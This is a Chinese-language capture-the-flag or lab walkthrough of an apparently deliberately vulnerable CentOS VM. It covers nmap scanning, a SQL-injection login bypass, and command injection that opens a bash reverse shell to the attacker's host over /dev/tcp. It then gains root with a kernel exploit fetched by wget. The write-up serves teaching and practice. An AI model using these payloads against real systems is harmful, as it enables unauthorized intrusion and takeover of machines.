0x01:通过netdiscover进行主机的发现

![图片](https://mmbiz.qpic.cn/mmbiz_png/yt0TxdOI0SygMciaPDO750nth4ZJGv7eZBjq3RGwHDoDmdcIf8ZKVdFiaRCWuCjZT1ia9fNDrOgukqYPTL8MUg69g/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

0x02:使用nmap去扫描主机开放的端口和服务

```
┌──(root💀kali)-[/usr/share/doc/proxychains4]
└─# nmap -sS -sV -T5 -A -p- 192.168.1.16
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-16 07:07 EDT
Nmap scan report for 192.168.1.16 (192.168.1.16)
Host is up (0.00051s latency).
Not shown: 65528 closed ports
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 3.9p1 (protocol 1.99)
| ssh-hostkey: 
|   1024 8f:3e:8b:1e:58:63:fe:cf:27:a3:18:09:3b:52:cf:72 (RSA1)
|   1024 34:6b:45:3d:ba:ce:ca:b2:53:55:ef:1e:43:70:38:36 (DSA)
|_  1024 68:4d:8c:bb:b6:5a:bd:79:71:b8:71:47:ea:00:42:61 (RSA)
|_sshv1: Server supports SSHv1
80/tcp   open  http       Apache httpd 2.0.52 ((CentOS))
|_http-server-header: Apache/2.0.52 (CentOS)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
111/tcp  open  rpcbind    2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1            661/udp   status
|_  100024  1            664/tcp   status
443/tcp  open  ssl/https?
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2009-10-08T00:10:47
|_Not valid after:  2010-10-08T00:10:47
|_ssl-date: 2021-06-16T15:07:12+00:00; +3h59m25s from scanner time.
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC4_64_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|_    SSL2_RC4_128_WITH_MD5
631/tcp  open  ipp        CUPS 1.1
| http-methods: 
|_  Potentially risky methods: PUT
|_http-server-header: CUPS/1.1
|_http-title: 403 Forbidden
664/tcp  open  status     1 (RPC #100024)
3306/tcp open  mysql      MySQL (unauthorized)
Aggressive OS guesses: QEMU user mode network gateway (95%), Konica Minolta 7035 printer (89%), Bay Networks BayStack 450 switch (software version 3.1.0.22) (89%), GNU Hurd 0.3 (88%), Allied Telesyn AT-9006SX/SC switch (88%), Linux 2.6.18 (CentOS 5, x86_64, SMP) (87%), Tyco 24 Port SNMP Managed Switch (87%), Oracle Virtualbox (87%), Bay Networks BayStack 450 switch (software version 4.2.0.16) (87%), Cabletron ELS100-24TXM Switch or Icom IC-7800 radio transceiver (87%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

Host script results:
|_clock-skew: 3h59m24s

TRACEROUTE (using port 80/tcp)
HOP RTT     ADDRESS
1   0.19 ms 10.0.2.2 (10.0.2.2)
2   0.31 ms 192.168.1.16 (192.168.1.16)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.73 seconds
```

0x03:开放的80端口，登陆网页查看可以利用的信息：

![图片](https://mmbiz.qpic.cn/mmbiz_png/yt0TxdOI0SygMciaPDO750nth4ZJGv7eZDe3jPqN3ROIxhBN5aLiaaB8NPtE1IYYQ6JP1QibLLbr7C5rypS2sbBnw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

usrname处，填写sql注入的测试，admin' or '1'='1 是否在入口处进行了过滤。点击登陆后，可以进行sql的注入，出现如下的页面.

![图片](https://mmbiz.qpic.cn/mmbiz_png/yt0TxdOI0SygMciaPDO750nth4ZJGv7eZ29tLbiapKDJnuRX7MQrTZsRAzOXn11bh1ZiaH29OgpWKJ39r3KEZm08g/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

输入测试，判断是否有命令注入。

![图片](https://mmbiz.qpic.cn/mmbiz_png/yt0TxdOI0SygMciaPDO750nth4ZJGv7eZtAh6uiblPiaicLMCiaxBsPIqO9rFk2b4IR1CffkGWticPXtF1rOlr6jYsFg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

在kali主机上使用nc监听指定的端口

![图片](https://mmbiz.qpic.cn/mmbiz_png/yt0TxdOI0SygMciaPDO750nth4ZJGv7eZVJiaqIrLe6FaACfNzicDfmB0q2iavy0GOiakdBDfX1KtjkXI2tWE77mXpQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

然后在网页上进行命令注入，打开一个交互的bash，

127.0.0.1 & bash -i >&/dev/tcp/192.168.1.201/4444 0>&1

![图片](https://mmbiz.qpic.cn/mmbiz_png/yt0TxdOI0SygMciaPDO750nth4ZJGv7eZb3IzWiaZcRfuYRics7qEbHe5NUX7JSuxvVAIlRw9q8vgAibbIICXUmnsw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

到这里得到了一个反弹的shell，但是这个用户是apache，不是root用户，下面进行提权方面的操作.

0x04:  

![图片](https://mmbiz.qpic.cn/mmbiz_png/yt0TxdOI0SygMciaPDO750nth4ZJGv7eZsCS8dDJ1Du2AclADmcl7HhI9IHquaSPkgbQAfm6rhb7ftfgtdkfMicg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

使用searchsploit对应操作系统的版本进行搜索。使用url结尾是9545的。

将exp下载到本地。然后在本地使用python创建一个简单的http文件的服务器，

![图片](https://mmbiz.qpic.cn/mmbiz_png/yt0TxdOI0SygMciaPDO750nth4ZJGv7eZSwwp5LztQyibZUy5WIAfalDR6aiaVr6V7wsY3sWgwlFsT0QupaMjpn4Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

在靶机的/tmp下使用wget将exp下载到本地。

![图片](https://mmbiz.qpic.cn/mmbiz_png/yt0TxdOI0SygMciaPDO750nth4ZJGv7eZdiabUAvQfk4sJNnczicPRr8SicfQAKia7OPl4yhgRUib7H0ZGKxVkyYNgng/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

通过exp的文档说明，进行编译，然后执行。进行提权的操作。

![图片](https://mmbiz.qpic.cn/mmbiz_png/yt0TxdOI0SygMciaPDO750nth4ZJGv7eZHjOzB0Qm32GOQnh3Pp4t3w4NjMnKRBcUDM6stDwAqdXZYThBzhqllQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

